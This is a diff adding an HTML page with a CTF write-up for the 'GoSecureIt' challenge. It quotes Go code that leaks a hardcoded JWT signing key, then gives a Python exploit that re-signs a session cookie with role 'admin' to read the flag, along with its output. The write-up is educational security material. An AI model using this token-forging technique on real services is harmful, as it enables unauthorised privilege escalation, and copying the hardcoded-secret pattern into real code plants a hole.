@@ -1,0 +1,443 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>GoSecureIt - ByteTheCookies</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="ByteTheCookies" />
+    
+
+    
+        <meta property="og:url" content="http://localhost:1313/writeups/m0lecon2025beginner/gosecureit/">
+  <meta property="og:site_name" content="ByteTheCookies">
+  <meta property="og:title" content="GoSecureIt">
+  <meta property="og:description" content="GoSecureIt Description: I’ve found this website under construction, at the moment you can only register, but I think there’s something strange in the cookie
+Introduction We are faced with an application written in go, not very complex with several files, but already looking at the folder tree we see the secret folder with secret.go inside and this code
+Source // filename: secret.go package secret var JwtSecretKey = []byte(&#34;schrody_is_always_watching&#34;) // I don&#39;t know why it&#39;s called secret, I&#39;ll just leave it here :) Obviously this is the cookie secret, but interacting with the web application there is not much to do, so it is worth checking other files, especially in Golang, when using the Gin framework it is often used to define routes in the main.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-12-23T16:49:40+01:00">
+    <meta property="article:modified_time" content="2024-12-23T16:49:40+01:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Golang">
+    <meta property="article:tag" content="Leaked Secret">
+    <meta property="article:tag" content="50 Points">
+    <meta property="article:tag" content="95 Solves">
+    <meta property="article:tag" content="Schrödy">
+
+    
+
+    
+        
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="GoSecureIt">
+  <meta name="twitter:description" content="GoSecureIt Description: I’ve found this website under construction, at the moment you can only register, but I think there’s something strange in the cookie
+Introduction We are faced with an application written in go, not very complex with several files, but already looking at the folder tree we see the secret folder with secret.go inside and this code
+Source // filename: secret.go package secret var JwtSecretKey = []byte(&#34;schrody_is_always_watching&#34;) // I don&#39;t know why it&#39;s called secret, I&#39;ll just leave it here :) Obviously this is the cookie secret, but interacting with the web application there is not much to do, so it is worth checking other files, especially in Golang, when using the Gin framework it is often used to define routes in the main.">
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li><li>
+                            <a href="/contacts/">✉️ Contacts</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">ByteTheCookies</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/contacts/" class="pure-menu-link">✉️ Contacts</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#source">Source</a></li>
+    <li><a href="#solution">Solution</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">Web</div>
+
+  
+    <div class="badge">Golang</div>
+
+  
+    <div class="badge">Leaked secret</div>
+
+  
+    <div class="badge">50 points</div>
+
+  
+    <div class="badge">95 solves</div>
+
+  
+    <div class="badge">Schrödy</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Dec 23, 2024
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    <h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>GoSecureIt</h1>
+<p><strong>Description</strong>: I&rsquo;ve found this website under construction, at the moment you can only register, but I think there&rsquo;s something strange in the cookie</p>
+
+<h2 id="introduction" class="header-anchor-wrapper">Introduction
+  <a href="#introduction" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>We are faced with an application written in go, not very complex with several files, but already looking at the folder tree we see the secret folder with secret.go inside and this code</p>
+
+<h2 id="source" class="header-anchor-wrapper">Source
+  <a href="#source" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<pre  class="mc-prism hide language-text" ><code class="language-go">// filename: secret.go
+package secret
+
+var JwtSecretKey = []byte(&quot;schrody_is_always_watching&quot;) // I don't know why it's called secret, I'll just leave it here :)
+</code></pre>
+<p>Obviously this is the cookie secret, but interacting with the web application there is not much to do, so it is worth checking other files, especially in Golang, when using the Gin framework it is often used to define routes in the main.go, in fact if we open it we can see</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">// filename: main.go
+r.GET(&quot;/flag&quot;, handler.AuthMiddleware(), func(c *gin.Context) {
+		role, _ := c.Get(&quot;role&quot;)
+		if role == &quot;admin&quot; {
+			c.String(http.StatusOK, os.Getenv(&quot;flag&quot;))
+		} else {
+			c.String(http.StatusForbidden, &quot;No flag for a normal user :/&quot;)
+		}
+	})
+</code></pre>
+<p>We can see that the role value is checked to see if it is admin, in which case the flag is printed, even though with c.GET it looks like it takes a get parameter it actually takes the value from the cookie we need to re-sign.</p>
+
+<h2 id="solution" class="header-anchor-wrapper">Solution
+  <a href="#solution" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>So to solve the challenge, all we have to do is modify the cookie we get when we log in by changing the role to admin and signing it with the leaked key.</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python"># filename: exploit.py
+
+#!/usr/bin/python3
+import random
+import string
+
+import requests
+import jwt
+
+BASE_URL = &quot;https://gosecureit.challs.m0lecon.it/&quot;
+
+s = requests.Session()
+
+def string_generator(length):
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
+
+def sign_jwt(cookie,secret):
+    decoded_jwt = jwt.decode(cookie, secret, algorithms=[&quot;HS256&quot;])
+    decoded_jwt['role'] = 'admin'
+    resigned_jwt = jwt.encode(decoded_jwt, secret, algorithm='HS256')
+    return resigned_jwt
+
+def register(username,password):
+    r = requests.post(BASE_URL + &quot;register&quot;, data={&quot;username&quot;: username, &quot;password&quot;: password})
+    if r.status_code != 200:
+        print(&quot;[+] Failed to register&quot;)
+        exit(1)
+    else:
+        print(&quot;[+] Registered successfully&quot;)
+
+def login(username,password):
+    r = requests.post(BASE_URL + &quot;login&quot;, data={&quot;username&quot;: username, &quot;password&quot;: password})
+    if r.status_code != 200:
+        print(&quot;[+] Failed to login&quot;)
+        exit(1)
+    else:
+        print(&quot;[+] Login successfully&quot;)
+
+    return r.json()
+
+def main():
+    username,password = string_generator(10),string_generator(10)
+    secret = &quot;schrody_is_always_watching&quot;
+    register(username,password)
+    cookies = login(username,password)
+    new_jwt = sign_jwt(cookies['token'],secret)
+    s.cookies.set('jwt', new_jwt)
+    r = s.get(BASE_URL + &quot;flag&quot;)
+    print(&quot;Flag: &quot; + r.text)
+
+if __name__ == &quot;__main__&quot;:
+	main()
+
+# goodluck by @akiidjk
+</code></pre>
+<pre  class="mc-prism hide language-text" ><code class="language-stdout">$ flag: ptm{Th4t'5_why_1t'5_c4ll3d_53cr3t?}
+</code></pre>
+<p align='right'>Author: akiidjk </p>
+
+</article>
+</div>
+   
+      </div>
+    </main>
+<footer>
+    <article>Copyright © 2024 by ByteTheCookies Team | v1.0</article>
+</footer>
+
+</body>
+</html>
